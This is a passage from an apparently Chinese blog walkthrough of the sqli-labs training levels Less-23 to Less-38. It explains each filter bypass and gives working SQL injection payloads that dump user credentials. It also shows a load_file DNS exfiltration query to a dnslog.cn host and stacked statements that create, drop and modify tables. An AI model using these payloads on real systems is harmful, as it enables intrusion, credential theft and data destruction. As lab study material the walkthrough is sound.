class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>只要通过单引号把后面闭合了即可，获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users) &#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24 二次注入"></a>Less-24 二次注入</h2><p>本关卡数据入参都有通过 <code>mysql_real_escape_string</code> 进行转义，本站提供了注册、登陆、登陆后修改密码功能</p><p>关键代码 pass_change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure><p>虽然SQL特殊字符被转义了，但如果注册时用户名是 <code>admin&#39;#</code>，那么登陆这个修改密码执行的 SQL 语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and ....</span></span><br></pre></td></tr></table></figure><p>则直接修改 admin 的密码，就能直接登陆管理员账号了</p><h2 id="Less-25-双写绕过or和and"><a href="#Less-25-双写绕过or和and" class="headerlink" title="Less-25 双写绕过or和and"></a>Less-25 双写绕过or和and</h2><p>验证注入点：id=1’</p><p>利用闭合方式：?id=1’ anandd 1=2 union select 1,2,3 ‘</p><p>这关会把 <code>or</code> 和 <code>and</code> 替换为空，通过双写绕过即可，或者通过等价符合 <code>&amp;&amp;</code> 和 <code>||</code> 绕过</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; anandd 1=2 union select 1,2,(select group_concat(username,passwoorrd separatoorr 0x3c62723e) from security.users) &#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-25a-双写绕过or和and"><a href="#Less-25a-双写绕过or和and" class="headerlink" title="Less-25a 双写绕过or和and"></a>Less-25a 双写绕过or和and</h2><p>验证注入点：?id=1%20anandd%20sleep(5)%20#</p><p>利用闭合方式：?id=1 anandd 1=2 union select 1,2,3 #</p><p>与Less-25一致，只是闭合方式不一样</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> anandd <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,passwoorrd separatoorr <span class="number">0x3c62723e</span>) <span class="keyword">from</span> security.users)</span><br></pre></td></tr></table></figure><h2 id="Less-26-空格绕过"><a href="#Less-26-空格绕过" class="headerlink" title="Less-26 空格绕过"></a>Less-26 空格绕过</h2><p>验证注入点：id=1’</p><p>利用闭合方式：?id=1%27%0banandd%0b1=2%0bunion%0bselect%0b1,2,3%0b%27</p><p>除了Less-23 Less-25 过滤的，还过滤了空格，空格可以通过以下符号代替</p><table><thead><tr><th align="left">符号</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">%09</td><td align="left">TAB 键(水平)</td></tr><tr><td align="left">%0a</td><td align="left">新建一行</td></tr><tr><td align="left">%0c</td><td align="left">新的一页</td></tr><tr><td align="left">%0d</td><td align="left">return 功能</td></tr><tr><td align="left">%0b</td><td align="left">TAB 键(垂直)</td></tr><tr><td align="left">%a0</td><td align="left">空格（和普通空格不一样）</td></tr></tbody></table><p>试了一下，最终只有 <code>%0b</code> 和 <code>%a0</code> 是可用的，注意，<code>%a0</code>我在mac（10.15.7）上用不了</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">0</span>banandd<span class="operator">%</span><span class="number">0</span>b1<span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b1,<span class="number">2</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(username,passwoorrd<span class="operator">%</span><span class="number">0</span>bseparatoorr<span class="operator">%</span><span class="number">0</span>b0x3c62723e)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bsecurity.users)<span class="operator">%</span><span class="number">0</span>b<span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="Less-26a-空格绕过"><a href="#Less-26a-空格绕过" class="headerlink" title="Less-26a 空格绕过"></a>Less-26a 空格绕过</h2><p>验证注入点：?id=1’)%a0anandd%a0sleep(5)%a0oorr%a0(‘</p><p>利用闭合方式：?id=1%27)%a0anandd%a01=2%a0union%a0select%a01,2,3%a0oorr%a0(%27</p><p>这关的注入点验证和闭合方式和之前的有很点不同，获取数据也和之前的有所不同，因为注释符也是被过滤了的，然后闭合方式是 <code>(&#39;&#39;)</code> ，我们无法直接通过 <code>1&#39;) (&#39;</code> 闭合，因为这样会多出一个 <code>(&#39;&#39;)</code> 导致 sql 语法错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL root<span class="variable">@localhost</span>:security<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>(<span class="string">&#x27;1&#x27;</span>) (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">(<span class="number">1064</span>, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;&#x27;)&#x27; at line 1&quot;)</span><br></pre></td></tr></table></figure><p>需要构造一下，使得后面的 <code>(&#39;&#39;)</code> 无作用，即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MySQL root<span class="variable">@localhost</span>:security<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">or</span> (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span></span><br><span class="line"><span class="type">Time</span>: <span class="number">0.010</span>s</span><br></pre></td></tr></table></figure><p>这里不能用 <code>and (&#39;&#39;)</code> 因为后面为非（空），查询不到数据，用 <code>or (&#39;&#39;)</code> 就行</p><p>最终获取数据查询语句，结合一下前面的绕过就OK了～</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span>a0aandnd<span class="operator">%</span>a01<span class="operator">=</span><span class="number">2</span><span class="operator">%</span>a0union<span class="operator">%</span>a0select<span class="operator">%</span>a01,(<span class="keyword">select</span><span class="operator">%</span>a0group_concat(username,passwoorrd<span class="operator">%</span>a0separatoorr<span class="operator">%</span>a00x3c62723e)<span class="operator">%</span>a0from<span class="operator">%</span>a0security.users),<span class="number">3</span><span class="operator">%</span>a0oorr<span class="operator">%</span>a0(<span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="Less-27-union过滤"><a href="#Less-27-union过滤" class="headerlink" title="Less-27 union过滤"></a>Less-27 union过滤</h2><p>验证注入点：?id=1’</p><p>利用闭合方式：?id=1’%0a%26%261=2%0auNion%0aseLect%0a1,2,3%0a’</p><p>过滤比较敷衍，没有区分大小写，而且也可以通过双写绕过，这里尝试了一下 <code>%0a</code> 突然也可以替换空格了</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%0A%26%26%0A1=2%0AuNion%0AseLect%0A1,group_concat(username),group_concat(password)%0Afrom%0Asecurity.users%0Awhere%0A1%26%26%0A&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>不知为啥下面分隔符没有效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">0</span>a<span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">0</span>a1<span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">0</span>auNion<span class="operator">%</span><span class="number">0</span>aseLect<span class="operator">%</span><span class="number">0</span>a1,<span class="number">2</span>,(<span class="keyword">seLect</span><span class="operator">%</span><span class="number">0</span>agroup_concat(username,password<span class="operator">%</span><span class="number">0</span>aseparator<span class="operator">%</span><span class="number">0</span>a0x3c62723e)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>asecurity.users)<span class="operator">%</span><span class="number">0</span>a<span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="Less-27a-union过滤"><a href="#Less-27a-union过滤" class="headerlink" title="Less-27a union过滤"></a>Less-27a union过滤</h2><p>验证注入点：?id=1%22%26%26sleep(5)%7c%7c%22</p><p>利用闭合方式：?id=1%22%26%261%3d2%a0uNion%a0seLect%a01,2,3%7c%7c%22</p><p>与Less-27一样，但这里SQL语句为，注意前3行还有个双引号拼接，有点小坑，怪不得直接执行不行…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> .<span class="variable">$id</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>获取数据，发现这两a关闭合方式有点小trick，需要设法让多余的符号失效</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">261</span><span class="operator">%</span><span class="number">3</span>d2<span class="operator">%</span><span class="number">0</span>auNion<span class="operator">%</span><span class="number">0</span>aseLect<span class="operator">%</span><span class="number">0</span>a1,<span class="number">2</span>,(<span class="keyword">seLect</span><span class="operator">%</span><span class="number">0</span>agroup_concat(username,password<span class="operator">%</span><span class="number">0</span>aseparator<span class="operator">%</span><span class="number">0</span>a0x3c62723e)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>asecurity.users)<span class="operator">%</span><span class="number">0</span>a<span class="operator">%</span><span class="number">22</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">261</span><span class="operator">%</span><span class="number">3</span>d2<span class="operator">%</span><span class="number">0</span>auNion<span class="operator">%</span><span class="number">0</span>aseLect<span class="operator">%</span><span class="number">0</span>a1,group_concat(username),group_concat(password)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>asecurity.users<span class="operator">%</span><span class="number">0</span>awhere<span class="operator">%</span><span class="number">0</span>a1<span class="operator">%</span><span class="number">7</span>c<span class="operator">%</span><span class="number">7</span>c<span class="operator">%</span><span class="number">22</span></span><br></pre></td></tr></table></figure><h2 id="Less-28-union-select-过滤"><a href="#Less-28-union-select-过滤" class="headerlink" title="Less-28 union select 过滤"></a>Less-28 union select 过滤</h2><p>验证注入点：?id=1%27)%26%26sleep(5)||(%27</p><p>利用闭合方式：?id=1’)%26%261%3d2%0Auniounion%0Aselectn%0Aselect%0A1,2,3||(‘</p><p>本次过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>双写 <code>uniounion%0aselectn%0aselect</code>即可</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)%26%261%3d2%0Auniounion%0Aselectn%0Aselect%0A1,(seLect%0agroup_concat(username,password%0aseparator%0a0x3c62723e)%0afrom%0asecurity.users),3||(&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-28a-union-select-过滤"><a href="#Less-28a-union-select-过滤" class="headerlink" title="Less-28a union select 过滤"></a>Less-28a union select 过滤</h2><p>这关只过滤了 union select，比Less-28过滤的还少，和 Less-28一样即可获取数据</p><h2 id="Less-29-HPP绕过白名单"><a href="#Less-29-HPP绕过白名单" class="headerlink" title="Less-29 HPP绕过白名单"></a>Less-29 HPP绕过白名单</h2><p>验证注入点：login.php?id=1&amp;id=1’</p><p>利用闭合方式：login.php?id=1&amp;id=1’ and 1=2 union select 1,2,3%23</p><p>这关 <code>login.php</code> 设置了一个白名单WAF，只允许数字，不过获取匹配的参数 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 然后匹配到第一个 <code>id</code> 就 break 掉了。但 PHP 通过 <code>$_GET[&#39;id&#39;]</code> 获取是覆盖关系，即同时存在多个URL参数时，只获取最后一个。但WAF判断的是第1个，所以就可以绕过了。这种方式也叫HPP，HTTP 参数污染</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users)%23</span></span><br></pre></td></tr></table></figure><h2 id="Less-30-amp-amp-Less-31-HPP绕过白名单"><a href="#Less-30-amp-amp-Less-31-HPP绕过白名单" class="headerlink" title="Less-30 &amp;&amp; Less-31 HPP绕过白名单"></a>Less-30 &amp;&amp; Less-31 HPP绕过白名单</h2><p>验证注入点：login.php?id=1&amp;id=1”</p><p>Less-30利用闭合方式：login.php?id=1&amp;id=1” and 1=2 union select 1,2,3%23</p><p>Less-31利用闭合方式：login.php?id=1&amp;id=1”) and 1=2 union select 1,2,3%23</p><p>只是和Less-29闭合方式不一样</p><p>Less-30获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">1</span>&quot; and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users)%23</span><br></pre></td></tr></table></figure><p>Less-31获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users)%23</span><br></pre></td></tr></table></figure><h2 id="Less-32-宽字节注入"><a href="#Less-32-宽字节注入" class="headerlink" title="Less-32 宽字节注入"></a>Less-32 宽字节注入</h2><p>验证注入点：?id=1%df%27</p><p>利用闭合方式：?id=1%df%27 and 1=2 union select 1,2,3%23</p><p><strong>原理</strong></p><p>客户端（如PHP，设置了GBK编码）-&gt; 连接层（MySQL编码处理）-&gt; 服务端（MySQL语句执行）</p><p>%df%27%65  -&gt; <code>%df%27</code>%65 (因为前一个ascii码要大于128，MySQL才会认为需要两个字节组合，然后 <code>%df%xx</code> 会进行多字节编码) -&gt; 导致%27没转义，进而导致注入</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username,password separator <span class="number">0x3c62723e</span>) <span class="keyword">from</span> security.users),<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="Less-33-宽字节注入"><a href="#Less-33-宽字节注入" class="headerlink" title="Less-33 宽字节注入"></a>Less-33 宽字节注入</h2><p>同 Less-32，Less-32是自己写的过滤，Less-33是原生的，32的好像也是只能宽字节才行。</p><h2 id="Less-34-POST-宽字节注入"><a href="#Less-34-POST-宽字节注入" class="headerlink" title="Less-34 POST 宽字节注入"></a>Less-34 POST 宽字节注入</h2><p>验证注入点：uname=123%df’</p><p>利用闭合方式：uname=123%df’ or 1=1%23</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(username,password separator <span class="number">0x3c62723e</span>) <span class="keyword">from</span> security.users),<span class="number">2</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>除了SQL语句查询列数和POST方式，其他一样</p><h2 id="Less-35-联合注入"><a href="#Less-35-联合注入" class="headerlink" title="Less-35 联合注入"></a>Less-35 联合注入</h2><p>验证注入点：?id=1’</p><p>利用闭合方式：?id=1 and 1=2 union select 1,2,3 #</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username,password separator <span class="number">0x3c62723e</span>) <span class="keyword">from</span> security.users),<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>过滤了个寂寞（</p><h2 id="Less-36-宽字节注入"><a href="#Less-36-宽字节注入" class="headerlink" title="Less-36 宽字节注入"></a>Less-36 宽字节注入</h2><p>验证注入点：?id=1%df%27</p><p>利用闭合方式：?id=1%df%27 and 1=2 union select 1,2,3%23</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username,password separator <span class="number">0x3c62723e</span>) <span class="keyword">from</span> security.users),<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>和 Less-33 利用方式一样，只不过过滤函数从 <code>addslashes</code> 变成 <code>mysql_real_escape_string</code>  </p><h2 id="Less-37-POST-宽字节注入"><a href="#Less-37-POST-宽字节注入" class="headerlink" title="Less-37 POST 宽字节注入"></a>Less-37 POST 宽字节注入</h2><p>利用方式同Less-34，过滤函数从 <code>addslashes</code> 变成 <code>mysql_real_escape_string</code>  </p><h2 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38 堆叠注入"></a>Less-38 堆叠注入</h2><p>验证注入点：?id=1’</p><p>利用闭合方式：?id=1’;</p><p>这个和之前SQL查询语句不同的是使用了 <code>mysqli_multi_query</code> ，SQL语句中分隔符为 <code>;</code> ，这个语句允许我们通过 <code>;</code> 同时执行多个语句</p><p>既然可以拼接任意语句，尝试获取版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;;select 1,version(),3%23</span></span><br></pre></td></tr></table></figure><p>发现前面就算执行为空，也不会拼接，这是因为服务端只获取第一条语句的执行结果</p><p>如果服务端没有返回每条语句执行的结果，则需要获取数据回显。</p><p>从国光那学到了一种<code>只在Windows系统下有效</code>的dnslog数据外带方式，因为 Windows下存在一种叫UNC（通用命名规则）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\192.168.123.1\xxx\</span><br></pre></td></tr></table></figure><p>我们平常在访问smb或者域机器的时候就挺熟悉这种访问方式的，就叫UNC，如果把IP换成域名，当然也会进行dns解析。因Linux没有这种东西，所以也没法进行dnslog数据外带了</p><p>这里使用Windows搭建个sqli-labs环境（注意phpstudy默认<code>secure_file_priv=NULL</code> 需要改 my.ini 在 <code>[mysqld]</code> 字段里增加 <code>secure_file_priv</code> ），然后写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;select load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select hex(concat_ws(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,username,password)) from security.users limit 0,1),&#x27;</span><span class="number">.1</span>di0pv.dnslog.cn\\a<span class="string">&#x27;))--+</span></span><br></pre></td></tr></table></figure><p>即可获取数据，注意 <code>limit 0,1</code> 不能去掉，否则太长了会接收不到数据，不知是不是dnslog平台做了长度的限制<img src="/img/sqli-labs/image-20220220132415746.png" class="lazyload" data-srcset="/img/sqli-labs/image-20220220132415746.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220220132415746"></p><p>这里和普通的注入还有很大不同，普通注入一般只能只能select 操作，因是执行独立的sql语句，还可以执行增删改数据库表和表数据语句，如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;create database less38;%23</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">drop</span> database less38;<span class="operator">%</span><span class="number">23</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;insert into users(id,username,password) values(&#x27;</span><span class="number">38</span><span class="string">&#x27;,&#x27;</span>less38<span class="string">&#x27;,&#x27;</span>less38<span class="string">&#x27;);%23</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;update users <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;less38p&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;38&#x27;</span>;<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">MySQL root<span class="variable">@localhost</span>:security<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookstore3         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> challenges         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> less38             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> onebase            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> security           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> xxl_job            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> xxxxx              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span></span><br><span class="line"><span class="type">Time</span>: <span class="number">0.007</span>s</span><br><span class="line">MySQL root<span class="variable">@localhost</span>:security<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookstore3         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> challenges         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> onebase            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> security           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> xxl_job     